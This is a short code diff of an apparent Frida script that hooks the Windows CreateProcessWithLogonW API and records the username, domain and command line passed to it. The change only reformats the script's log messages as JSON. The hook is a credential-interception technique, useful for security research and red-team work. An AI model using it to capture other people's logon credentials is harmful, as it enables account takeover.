@@ -1,8 +1,17 @@
+// Base code taken from ihack4falafel
+
 var pCreateProcessWithLogonW = Module.findExportByName("Advapi32.dll", 'CreateProcessWithLogonW')
 
 Interceptor.attach(pCreateProcessWithLogonW, {
     onEnter: function (args) {
-        // send("[+] CreateProcessWithLogonW API hooked!");
+        send(JSON.stringify({
+            type: "log",
+            from: "CreateProcessWithLogonW",
+            data: {
+                text: "CreateProcessWithLogonW API hooked!",
+                type: "INFO"
+            }
+        }));
         // Save the following arguments for OnLeave
         this.lpUsername = args[0];
         this.lpDomain = args[1];
@@ -11,7 +20,14 @@ Interceptor.attach(pCreateProcessWithLogonW, {
         this.lpCommandLine = args[5];
     },
     onLeave: function (args) {
-        // send("[+] Retrieving argument values..");
+        send(JSON.stringify({
+            type: "log",
+            from: "CreateProcessWithLogonW",
+            data: {
+                text: "Retrieving argument values..",
+                type: "INFO"
+            }
+        }));
         send(JSON.stringify({
             type: "data",
             from: "CreateProcessWithLogonW",
